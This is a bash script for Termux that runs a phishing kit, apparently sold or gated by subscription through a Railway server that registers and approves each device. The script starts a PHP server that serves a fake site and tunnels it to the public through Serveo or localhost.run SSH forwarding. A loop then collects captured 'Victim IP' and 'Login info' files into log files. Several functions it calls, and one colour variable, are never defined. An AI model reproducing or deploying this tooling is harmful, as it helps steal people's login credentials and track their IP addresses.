#!/data/data/com.termux/files/usr/bin/bash

# Your Railway app URL
SERVER_URL="https://worker-production-00bb.up.railway.app/register"
CHECK_URL="https://worker-production-00bb.up.railway.app/check"

# Generate a unique user ID based on hostname + MAC address
#generate_user_id() {
#    USER_ID=$(hostname)-$(cat /etc/machine-id)
#    echo "$USER_ID"
#}

generate_user_id() {
    ID_FILE="$HOME/.script_user_id"

    # If an ID already exists, use it
    if [[ -f "$ID_FILE" ]]; then
        USER_ID=$(cat "$ID_FILE")
    else
        # Generate a unique ID and save it
        USER_ID=$(hostname)-$(uuidgen || echo $RANDOM$RANDOM)
        echo "$USER_ID" > "$ID_FILE"
    fi

    echo "$USER_ID"
}

# Register the user with the Railway server
register_user() {
    USER_ID=$(generate_user_id)
    RESPONSE=$(curl -s "$SERVER_URL?user=$USER_ID")
    echo "$RESPONSE"
}

# Check if the user is approved & subscription status
check_access() {
    USER_ID=$(generate_user_id)
    RESPONSE=$(curl -s "$CHECK_URL?user=$USER_ID")

    STATUS=$(echo "$RESPONSE" | jq -r '.status')
    MESSAGE=$(echo "$RESPONSE" | jq -r '.message')

    if [[ "$STATUS" == "approved" ]]; then
        echo "✅ $MESSAGE"
    elif [[ "$STATUS" == "expired" ]]; then
        echo "❌ $MESSAGE"
        exit 1
    else
        echo "⏳ $MESSAGE"
        exit 1
    fi
}

# --- COLOR CODES ---
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
YELLOW="$(printf '\033[33m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
RESET="$(printf '\e[0m')"

HOST="127.0.0.1"

# --- TERMINATE PHP PROCESSES ---
kill_pid() {
    local process="php"
    if pidof "$process" > /dev/null; then
        killall "$process" > /dev/null 2>&1
        echo "Stopped running PHP processes."
    else
        echo -e "No PHP processes found."
    fi
}

# --- SETUP LINK SITE ---
setup_site() {
    clear
    banner
    cd work
    git pull
    echo -e "${YELLOW}Enter Port Number to Host On:${RESET}"
    read -r PORT
    if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
        echo "Invalid port number. Please enter a number."
        return
    fi
    echo -e "Starting PHP server on port $PORT..."
    php -S "$HOST":"$PORT" &>/dev/null &
    echo "Server started at http://$HOST:$PORT"
}

# --- MONITOR DATA ---
capture_data() {
    while true; do
        check_remote_control  # Ensure script isn't disabled remotely

        if [[ -f ".server/www/ip.txt" ]]; then
            echo "Victim IP captured!"
            cat .server/www/ip.txt >> data/ip_logs.dat
            rm -f .server/www/ip.txt
        fi

        if [[ -f ".server/www/usernames.txt" ]]; then
            echo "Login info found!"
            cat .server/www/usernames.txt >> data/usernames.dat
            rm -f .server/www/usernames.txt
        fi

        sleep 1
    done
}

# --- HOST SERVER PUBLICLY ---
# --- HOST SERVER PUBLICLY ---
host_server() {
    if [ -z "$PORT" ]; then
        echo "PORT is not set. Please export PORT=<your_port> and try again."
        return 1
    fi

    echo "Hosting on Serveo..."
    ssh -R 80:localhost:$PORT serveo.net || {
        echo "Serveo failed. Trying localhost.run..."
        ssh -R 80:localhost:$PORT nokey@localhost.run
    }
}

# --- INSTALL REQUIRED DEPENDENCIES ---
install_dependencies() {
    echo "Installing required packages..."
    apt update && apt upgrade -y
    for pkg in php openssh git curl; do
        if ! command -v "$pkg" &>/dev/null; then
            echo "$pkg not found, installing..."
            apt install "$pkg" -y
        else
            echo "$pkg is already installed."
        fi
    done
}

# --- SETUP GIT CONFIGURATION ---
git_setup() {
    git config --global user.email "test@gmail.com"
    git config --global user.name "test"
}

# --- DISPLAY BANNER ---
banner() {
    printf "${BLUE}
    ███████╗███╗   ██╗████████╗██╗  ██╗███████╗
    ██╔════╝████╗  ██║╚══██╔══╝██║  ██║██╔════╝
    █████╗  ██╔██╗ ██║   ██║   ███████║█████╗
    ██╔══╝  ██║╚██╗██║   ██║   ██╔══██║██╔══╝
    ███████╗██║ ╚████║   ██║   ██║  ██║███████╗
    ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚══════╝${RESET}"
}

# --- MAIN MENU ---
main_menu() {
    while true; do
        clear
        banner
        echo -e "${YELLOW}Select an option:${RESET}"
        echo -e "1) Install dependencies"
        echo -e "2) Setup and start server"
        echo -e "3) Monitor logins & IPs"
        echo -e "4) Check for updates"
        echo -e "5) Kill PHP processes"
        echo -e "6) Exit"

        read -rp "Enter your choice: " choice

        case $choice in
            1) install_dependencies ;;
            2) setup_site && host_server ;;
            3) capture_data ;;
            4) auto_update ;;
            5) kill_pid ;;
            6) exit 0 ;;
            *) echo "Invalid choice. Try again." ;;
        esac

        read -rp "Press Enter to continue..." _  # Wait before returning to menu
    done
}

# Run the functions
register_user
check_access
git pull
main_menu
